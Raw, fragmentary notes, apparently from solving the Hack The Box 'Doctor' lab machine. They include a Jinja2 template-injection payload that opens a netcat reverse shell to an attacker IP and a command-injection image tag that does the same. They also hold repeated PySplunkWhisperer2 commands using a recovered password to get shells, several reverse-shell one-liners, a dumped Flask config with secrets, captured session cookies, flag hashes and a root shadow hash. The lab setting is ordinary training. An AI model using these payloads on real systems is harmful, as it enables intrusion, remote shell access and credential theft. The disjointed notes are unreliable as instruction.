 10.10.10.209 

info@doctors.htb

Jade Guzman
Hannah Ford
James Wilson
 
Elizabeth Anderson, Hostpital Patients 


change /etc/hosts from doctor.htb to doctors.htb


```
<div class="collapse navbar-collapse" id="navbarToggle">
            <div class="navbar-nav mr-auto">
              <a class="nav-item nav-link" href="/home">Home</a>
              <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
            </div>
            <!-- Navbar Right Side -->
            <div class="navbar-nav">
```


POST /post/new HTTP/1.1
Host: doctors.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://doctors.htb
Connection: close
Referer: http://doctors.htb/post/new
Cookie: session=.eJwljjFqBDEMAP_iOoUkW5J1n1lkySIhkMDuXRXy9yyknCmG-WlHnft6b4_n-dpv7fjI9mgOXaJwYQQMYgwQTsFJo6y0syUl2yZKtRUdh2BNdZShGIqrxGepETHMYplpSHdpgUb5wDvclc2HaWWuPQGQvXeQFTFyYLtHXtc-_2_oxrjOOp7fn_vrFmw2ObcmsrIbpZHwlOQom7LJHTwZVvv9Ay2-PgA.X-UpCA.y5DS_9yX7uwSkitSbGisAjZPFjs; remember_token=2|c158651ba50229ecb07b763d503094500b9525ec9aef9d410aa3e3ad758a70402054f520cb62858aa4566d01a16eb0fba9b538426d7f476eddf0e758da9a3684
Upgrade-Insecure-Requests: 1

title=test&content=test&submit=Post



	<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>25</title></item>

			</channel>
			<item><title>${7*7}</title></item>

			</channel>
			<item><title>49</title></item>

			</channel>
			
{{5*5}}
<item><title>25</title></item>


{{7*'7'}}
 </channel>
			<item><title>7777777</title></item>

			</channel>
			
^ that means template being used is jinja2, ssti

the webpage is also running flask, googling flask exploits gives us with ssti

https://portswigger.net/research/server-side-template-injection


			<item><title>dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, &#39;1234&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(days=31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(seconds=43200)), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093), (&#39;MAIL_PASSWORD&#39;, &#39;doctor&#39;), (&#39;MAIL_PORT&#39;, 587), (&#39;MAIL_SERVER&#39;, &#39;&#39;), (&#39;MAIL_USERNAME&#39;, &#39;doctor&#39;), (&#39;MAIL_USE_TLS&#39;, True), (&#39;SQLALCHEMY_DATABASE_URI&#39;, &#39;sqlite://///home/web/blog/flaskblog/site.db&#39;), (&#39;WTF_CSRF_CHECK_DEFAULT&#39;, False), (&#39;SQLALCHEMY_BINDS&#39;, None), (&#39;SQLALCHEMY_NATIVE_UNICODE&#39;, None), (&#39;SQLALCHEMY_ECHO&#39;, False), (&#39;SQLALCHEMY_RECORD_QUERIES&#39;, None), (&#39;SQLALCHEMY_POOL_SIZE&#39;, None), (&#39;SQLALCHEMY_POOL_TIMEOUT&#39;, None), (&#39;SQLALCHEMY_POOL_RECYCLE&#39;, None), (&#39;SQLALCHEMY_MAX_OVERFLOW&#39;, None), (&#39;SQLALCHEMY_COMMIT_ON_TEARDOWN&#39;, False), (&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;, None), (&#39;SQLALCHEMY_ENGINE_OPTIONS&#39;, {})])</title></item>


{{config.__class__.__init__.__globals__['os'].system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.83 1234 >/tmp/f')}}

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f

<img src=http://10.10.14.156/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.156'$IFS'8000')>
found user shaun

cd /var/log/apache2/backup
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#tools


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

python3 PySplunkWhisperer2_remote.py --host 10.10.10.209  --lhost 10.10.14.176  --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh '10.10.14.156' '6789''
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.156 --username shaun --password Guitar123 --payload 'nc -e /bin/sh 10.10.14.156 6789'

python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.156 --username shaun --password Guitar123 --payload 'nc -e /bin/sh 10.10.14.156 6789'



python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.156 --username shaun --password Guitar123 --payload 'ncat 10.10.14.156 4242 -e /bin/bash'
nc -e /bin/sh 10.0.0.1 4242

python3 PySplunkWhisperer2_remote.py --host 10.10.10.209  --lhost 10.10.14.156  --username shaun --password Guitar123 --payload 'nc.traditional -e /bin/sh 10.10.14.156 4242'
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209  --lhost 10.10.14.156  --username shaun --password Guitar123 --payload 'nc -e /bin/sh 10.10.14.156 4242'

python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.176 --username shaun --password Guitar123 --payload 'python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.176",2345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")''

10.10.14.176







ncat 10.10.14.156 4242 -e /bin/bash

nc -l -p 12345


nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242

root
8297ad3b42d602c8c55e2e7326e599fc


e553bb3ed95747783983736bf4190114


root:$6$384TbSO3bB1PWLT1$U8U.j.zBLXobhorPDxOMRZh4eE86lcn7C0dvqRvfJ9qDzreti8HDvXwFZccDat9/HJRNwu04ErVxo3mUwVbs5.:18512:0:99999:7:::
